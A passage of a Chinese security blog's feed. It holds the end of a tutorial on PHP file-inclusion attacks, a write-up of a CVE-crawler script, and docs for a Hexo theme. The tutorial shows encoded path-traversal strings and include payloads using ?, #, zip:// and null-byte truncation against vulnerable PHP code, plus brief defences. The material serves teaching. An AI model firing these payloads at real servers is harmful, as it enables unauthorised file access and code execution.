class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用../或..\</p><p>编码绕过：</p><ul><li>利用URL编码<ul><li>../<ul><li>%2e%2e%2f</li></ul></li><li>..\<ul><li>%2e%2e%5c</li></ul></li></ul></li><li>二次编码<ul><li>../<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul></li><li>容器或服务器的编码方式<ul><li>../<ul><li>%252e%252e%255c<ul><li><a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li></ul></li><li>%c0%ae%c0%ae/<ul><li>java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li><li>Apache Tomcat Directory Traversal</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul></li></ul><h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>服务器代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用URL特殊符号"><a href="#利用URL特殊符号" class="headerlink" title="利用URL特殊符号"></a>利用URL特殊符号</h3><h4 id="query"><a href="#query" class="headerlink" title="query(?)"></a>query(?)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt?</span><br></pre></td></tr></table></figure><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code></p><h4 id="fragment"><a href="#fragment" class="headerlink" title="fragment(#)"></a>fragment(#)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23</span><br></pre></td></tr></table></figure><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code></p><blockquote><p>注意需要把#进行url编码为%23。</p></blockquote><h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>利用zip协议，注意要指定绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure><p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件：</p><p>php版本小于5.2.8</p><p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p><h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件：<br>php版本小于5.3.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;phpinfo.txt%00</span><br></pre></td></tr></table></figure><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li><li>做好文件的权限管理</li><li>对危险字符进行过滤等等</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;本地文件包含的利用思路&quot;&gt;&lt;a href=&quot;#本地文件包含的利用思路&quot; class=&quot;headerlink&quot; title=&quot;本地文件包含的利用思路&quot;&gt;&lt;/a&gt;本地文件包含的利用思路&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;通过日志写入任意代码进行包含攻击&lt;/li&gt;
&lt;li&gt;利用</summary>
      
    
    
    
    
    <category term="web" scheme="https://canc3s.github.io/tags/web/"/>
    
    <category term="php" scheme="https://canc3s.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>CVE 爬虫</title>
    <link href="https://canc3s.github.io/2019/01/06/CVE-%E7%88%AC%E8%99%AB/"/>
    <id>https://canc3s.github.io/2019/01/06/CVE-%E7%88%AC%E8%99%AB/</id>
    <published>2019-01-06T15:30:04.000Z</published>
    <updated>2021-01-30T15:40:54.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python3爬国家漏洞信息库"><a href="#Python3爬国家漏洞信息库" class="headerlink" title="Python3爬国家漏洞信息库"></a>Python3爬国家漏洞信息库</h1><h2 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h2><h3 id="先确定要爬的网站并观察他URL的规律"><a href="#先确定要爬的网站并观察他URL的规律" class="headerlink" title="先确定要爬的网站并观察他URL的规律"></a>先确定要爬的网站并观察他URL的规律</h3><p>发现，当url为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F;</span><br></pre></td></tr></table></figure><p>会显示出所有时间段的链接，点击2018年8月的链接时，他的url变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F;2018&#x2F;8</span><br></pre></td></tr></table></figure><p>不难发现规律是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;full-listing&#x2F;年&#x2F;月</span><br></pre></td></tr></table></figure><p>构造好爬取网站的url后开始提取网站内的数据，使用xpath，可以精准提取到页面里展示出来的所有漏洞名称和超链接，但xpath获取的超链接不完整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;vuln&#x2F;detail&#x2F;CVE-2018-0413</span><br></pre></td></tr></table></figure><p>点击超链接之后发现真实地址是xpath提取的超链接加该网站的完整域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2018-0413</span><br></pre></td></tr></table></figure><p>这样就有了进一步的思路，将具体月份内的所有漏洞列表的超链接拼接为可用的具体网址，存放在列表里，方便之后的遍历访问。</p><h3 id="爬取并保存信息"><a href="#爬取并保存信息" class="headerlink" title="爬取并保存信息"></a>爬取并保存信息</h3><p>打开漏洞网址利用xpath将网页内的信息提取出来，按键值对有序的存放在该漏洞的字典中，其中Impact部分数据比较复杂。因此，在建两个字典分别存放3.0和2.0版本的具体影响。</p><blockquote><p>因为每个网页中的字段数量不同，因此存在只有标题没有内容的情况，因此某些特定地方需要加判断来增加程序的健壮性</p></blockquote><blockquote><p>其次，存在很多内容存在样式，所以需要用strip和join进行去空格和拼接，字符串切片处理</p></blockquote><p>将数据爬取下来后为了让数据更具有可读性，增加了翻译功能</p><h2 id="增加功能"><a href="#增加功能" class="headerlink" title="增加功能"></a>增加功能</h2><p>使用随机请求头来减少拒绝请求的次数</p><p>在爬取的过程中总是存在“服务器长期未答应”或者“服务器强制关闭了此连接”的错误，猜测服务器存在反爬虫机制，因此是用来随机请求头的方式来建立简单地反反爬虫机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;User-Agent&#39;: choice(UAlist)</span><br></pre></td></tr></table></figure><blockquote><p>随机选择列表中的请求头，来迷惑服务器，减少请求数量达到服务器规定阀值的机会</p></blockquote><h3 id="确定使用的翻译接口"><a href="#确定使用的翻译接口" class="headerlink" title="确定使用的翻译接口"></a>确定使用的翻译接口</h3><p>截取漏洞网站的一段话分别放进百度翻译，有道翻译，google翻译，检测翻译的准确性，结果如下：</p><p>原话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A vulnerability in the web-based management interface of Cisco Identity Services Engine (ISE) could allow an </span><br><span class="line"></span><br><span class="line">unauthenticated, remote attacker to conduct a cross-site request forgery (CSRF) attack and perform arbitrary </span><br><span class="line"></span><br><span class="line">actions on an affected device. The vulnerability is due to insufficient CSRF protections for the web-based </span><br><span class="line"></span><br><span class="line">management interface of an affected device. An attacker could exploit this vulnerability by persuading a </span><br><span class="line"></span><br><span class="line">user of the interface to follow a crafted link. A successful exploit could allow the attacker to perform arbitrary</span><br><span class="line"></span><br><span class="line">actions on a targeted device via a web browser and with the privileges of the user. Cisco Bug IDs: CSCvi85159.</span><br></pre></td></tr></table></figure><p>百度翻译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cisco Identity Services Engine(ISE)的基于网络的管理接口中的漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造(CSRF)</span><br><span class="line"></span><br><span class="line">攻击并在受影响的设备上执行任意操作。该漏洞是由于受影响设备的基于网络的管理接口没有足够的CSRF保护造成的。攻击者可以通过说服接口</span><br><span class="line"></span><br><span class="line">的用户遵循精心编制的链接来利用此漏洞。成功利用此漏洞可使攻击者通过Web浏览器并以用户的权限在目标设备上执行任意操作。CiscoBugID：</span><br><span class="line"></span><br><span class="line">CSCvi85159。</span><br></pre></td></tr></table></figure><p>有道翻译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cisco Identity Services Engine (ISE)基于web的管理界面中的一个漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造</span><br><span class="line"></span><br><span class="line">(cross-site request forgery, CSRF)攻击，并在受影响的设备上执行任意操作。该漏洞是由于受影响设备的基于web的管理界面的CSRF</span><br><span class="line"></span><br><span class="line">保护不足造成的。攻击者可以通过说服界面用户遵循精心设计的链接来利用这个漏洞。一个成功的攻击可以允许攻击者通过web浏览器和用户的特权</span><br><span class="line"></span><br><span class="line">在目标设备上执行任意操作。Cisco Bug id: CSCvi85159。</span><br></pre></td></tr></table></figure><p>google翻译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">思科身份服务引擎（ISE）基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造（CSRF）攻击并在受影响的设备上执</span><br><span class="line"></span><br><span class="line">行任意操作。 该漏洞是由于受影响设备的基于Web的管理界面的CSRF保护不足。 攻击者可以通过说服界面的用户遵循精心设计的链接来利用此漏洞。</span><br><span class="line"></span><br><span class="line">成功利用可以允许攻击者通过Web浏览器并使用用户的权限在目标设备上执行任意操作。 思科Bug ID：CSCvi85159。</span><br></pre></td></tr></table></figure><p>通过以上结果发现google翻译最贴切实意，因此确定使用google翻译</p><h3 id="发现并使用google翻译接口"><a href="#发现并使用google翻译接口" class="headerlink" title="发现并使用google翻译接口"></a>发现并使用google翻译接口</h3><p>首先发现url是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;translate.google.cn&#x2F;#view&#x3D;home&amp;op&#x3D;translate&amp;sl&#x3D;en&amp;tl&#x3D;zh-CN&amp;text&#x3D;A%20vulnerability%20in%20the%20web-</span><br><span class="line"></span><br><span class="line">based%20management%20interface%20of%20Cisco%20Identity%20Services%20Engine%20(ISE)%20could%20allow%20an</span><br><span class="line"></span><br><span class="line">%20unauthenticated%2C%20remote%20attacker%20to%20conduct%20a%20cross-site%20request%20forgery%20(CSRF)%</span><br><span class="line"></span><br><span class="line">20attack%20and%20perform%20arbitrary%20actions%20on%20an%20affected%20device.%20The%20vulnerability%20is%</span><br><span class="line"></span><br><span class="line">20due%20to%20insufficient%20CSRF%20protections%20for%20the%20web-based%20management%20interface%20of%</span><br><span class="line"></span><br><span class="line">20an%20affected%20device.%20An%20attacker%20could%20exploit%20this%20vulnerability%20by%20persuading%20a%</span><br><span class="line"></span><br><span class="line">20user%20of%20the%20interface%20to%20follow%20a%20crafted%20link.%20A%20successful%20exploit%20could%</span><br><span class="line"></span><br><span class="line">20allow%20the%20attacker%20to%20perform%20arbitrary%20actions%20on%20a%20targeted%20device%20via%20a%</span><br><span class="line"></span><br><span class="line">20web%20browser%20and%20with%20the%20privileges%20of%20the%20user.%20Cisco%20Bug%20IDs%3A%20CSCvi85159.</span><br></pre></td></tr></table></figure><p>很容易发现url中带有我们所要翻译的句子，然后也准备好了可以筛选出翻译部分的xpath规则，但运行程序后发现总是返回空集。后来查看网页源代码后发现源代码中确实没有翻译的内容，所以推测他是使用某种神秘手段显示。</p><p>然后观察浏览器与服务器的通信发现每次他都会和一个网址发起请求，并且网址会返回以列表嵌套的方式返回翻译内容，翻译状况等信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;translate.google.cn&#x2F;translate_a&#x2F;single?client&#x3D;webapp&amp;sl&#x3D;en&amp;tl&#x3D;zh-CN&amp;hl&#x3D;zh-CN&amp;dt&#x3D;at&amp;dt&#x3D;bd&amp;dt&#x3D;ex</span><br><span class="line"></span><br><span class="line">&amp;dt&#x3D;ld&amp;dt&#x3D;md&amp;dt&#x3D;qca&amp;dt&#x3D;rw&amp;dt&#x3D;rm&amp;dt&#x3D;ss&amp;dt&#x3D;t&amp;otf&#x3D;1&amp;ssel&#x3D;0&amp;tsel&#x3D;0&amp;kc&#x3D;2&amp;tk&#x3D;831447.664573&amp;q&#x3D;A%</span><br><span class="line"></span><br><span class="line">20vulnerability%20in%20the%20web-based%20management%20interface%20of%20Cisco%20Identity%20Services%</span><br><span class="line"></span><br><span class="line">20Engine%20(ISE)%20could%20allow%20an%20unauthenticated%2C%20remote%20attacker%20to%20conduct%20a%</span><br><span class="line"></span><br><span class="line">20cross-site%20request%20forgery%20(CSRF)%20attack%20and%20perform%20arbitrary%20actions%20on%20an%</span><br><span class="line"></span><br><span class="line">20affected%20device.%20The%20vulnerability%20is%20due%20to%20insufficient%20CSRF%20protections%20for%20the</span><br><span class="line"></span><br><span class="line">%20web-based%20management%20interface%20of%20an%20affected%20device.%20An%20attacker%20could%20exploit</span><br><span class="line"></span><br><span class="line">%20thivulnerability%20by%20persuading%20a%20user%20of%20the%20interface%20to%20follow%20a%20crafted%</span><br><span class="line"></span><br><span class="line">20link.%20A%20successful%20exploit%20could%20allow%20the%20attacker%20to%20perform%20arbitrary%20actions%</span><br><span class="line"></span><br><span class="line">20on%20a%20targeted%20device%20via%20a%20web%20browser%20and%20with%20the%20privileges%20of%20the%</span><br><span class="line"></span><br><span class="line">20user.%20Cisco%20Bug%20IDs%3A%20CSCvi85159.</span><br></pre></td></tr></table></figure><blockquote><p>浏览器以GET方式发出请求并携带了几个参数：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">baseUrl=<span class="string">&#x27;https://translate.google.cn/translate_a/single&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;?client=t&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;s1=auto&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;t1=zh-CN&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;h1=zh-CN&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=at&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=bd&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=ex&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=ld&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=md&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=qca&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=rw&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=rm&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=ss&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;dt=t&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;ie=UTF-8&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;oe=UTF-8&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;otf=1&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;pc=1&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;ssel=0&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;tsel=0&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;kc=2&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;tk=831447.664573&amp;&#x27;</span></span><br><span class="line">baseUrl+=<span class="string">&#x27;q=&#x27;</span>+text</span><br></pre></td></tr></table></figure><p>利用代码，拼接好url后请求发现他只能翻译那句话，其他话返回403界面。然后通过尝试发现改变tk参数后，那句话也没办法翻译了，因此推测tk是一个请求服务的关键参数。</p><p>通过百度后发现有人已经写出了这个密钥的生成原理，利用他的生成原理果然可以返回正确的结果，然后把这个功能进行了分装，然后在需要翻译的地方进行了调用。</p><h3 id="提高代码的灵活性"><a href="#提高代码的灵活性" class="headerlink" title="提高代码的灵活性"></a>提高代码的灵活性</h3><p>增加了用户输入接口，让用户有选择的余地，可以根据自己的需求灵活的自定义参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        year = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你想爬哪年的CVE?(1988-2018)&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> year &gt;= <span class="number">1988</span> <span class="keyword">and</span> year &lt;= <span class="number">2018</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;请重新输入&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        month = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你想爬哪年的CVE?(1-12)&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> month &gt;= <span class="number">1</span> <span class="keyword">and</span> month &lt;= <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;请重新输入&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mod = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;是否保存数据到本地?\n1 保存\n2 不保存&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> mod == <span class="number">1</span> <span class="keyword">or</span> mod == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;请重新输入&quot;</span>)</span><br><span class="line">    CVEs = fun.getCVEs(year,month)</span><br><span class="line">    details = fun.getDetails(CVEs)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="number">1</span>:</span><br><span class="line">        write(details)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show(details)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python3爬国家漏洞信息库&quot;&gt;&lt;a href=&quot;#Python3爬国家漏洞信息库&quot; class=&quot;headerlink&quot; title=&quot;Python3爬国家漏洞信息库&quot;&gt;&lt;/a&gt;Python3爬国家漏洞信息库&lt;/h1&gt;&lt;h2 id=&quot;思路流程&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="编程" scheme="https://canc3s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="python" scheme="https://canc3s.github.io/tags/python/"/>
    
    <category term="爬虫" scheme="https://canc3s.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="CVE" scheme="https://canc3s.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>标签插件</title>
    <link href="https://canc3s.github.io/2018/01/03/%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6/"/>
    <id>https://canc3s.github.io/2018/01/03/%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6/</id>
    <published>2018-01-03T15:30:04.000Z</published>
    <updated>2021-01-30T15:38:19.250Z</updated>
    
    <content type="html"><![CDATA[<p>为了兼容老用户，旧的标签插件在重构之前依然沿用旧的格式，即「英文逗号+空格」作为参数分隔符，而部分新增标签插件是「空格+英文竖线+空格」，请注意区分。</p><blockquote><p>我们也在探索哪种分隔符既简单又不容易引起冲突，所以可能存在多种格式，具体以对应文档描述为准。</p></blockquote><h2 id="text"><a href="#text" class="headerlink" title="text"></a>text</h2><p>这是一些文本样式标签：</p><p>带 <u>下划线</u> 的文本</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带 &#123;% u 下划线 %&#125; 的文本</span><br></pre></td></tr></table></figure><p>带 <emp>着重号</emp> 的文本</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带 &#123;% emp 着重号 %&#125; 的文本</span><br></pre></td></tr></table></figure><p>带 <wavy>波浪线</wavy> 的文本</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带 &#123;% wavy 波浪线 %&#125; 的文本</span><br></pre></td></tr></table></figure><p>带 <del>删除线</del> 的文本</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">带 &#123;% del 删除线 %&#125; 的文本</span><br></pre></td></tr></table></figure><p>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br></pre></td></tr></table></figure><p>密码样式的文本：<psw>这里没有验证码</psw></p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="span"><a href="#span" class="headerlink" title="span"></a>span</h2><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>2.5</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数, 文本内容 %&#125;</span><br></pre></td></tr></table></figure><h3 id="彩色文字"><a href="#彩色文字" class="headerlink" title="彩色文字"></a>彩色文字</h3><p>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</p><h3 id="超大号文字"><a href="#超大号文字" class="headerlink" title="超大号文字"></a>超大号文字</h3><p>文档「开始」页面中的标题部分就是超大号文字。</p><span class='p center logo large'>Volantis</span><span class='p center small'>A Wonderful Theme for Hexo</span><h3 id="上述示例的源码"><a href="#上述示例的源码" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#### 彩色文字</span></span><br><span class="line"></span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"></span><br><span class="line"><span class="section">#### 超大号文字</span></span><br><span class="line"></span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line"></span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数"><a href="#可以支持的参数" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><p>样式参数位置可以写颜色、大小和对齐方向，多个样式参数用空格隔开。</p><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logo, code</span><br></pre></td></tr></table></figure><h4 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">red, yellow, green, cyan, blue, gray</span><br></pre></td></tr></table></figure><h4 id="大小"><a href="#大小" class="headerlink" title="大小"></a>大小</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">small, h4, h3, h2, h1, large, huge, ultra</span><br></pre></td></tr></table></figure><h4 id="对齐方向"><a href="#对齐方向" class="headerlink" title="对齐方向"></a>对齐方向</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left, center, right</span><br></pre></td></tr></table></figure><br><h2 id="p"><a href="#p" class="headerlink" title="p"></a>p</h2><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>2.5</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数, 文本内容 %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果"><a href="#演示效果" class="headerlink" 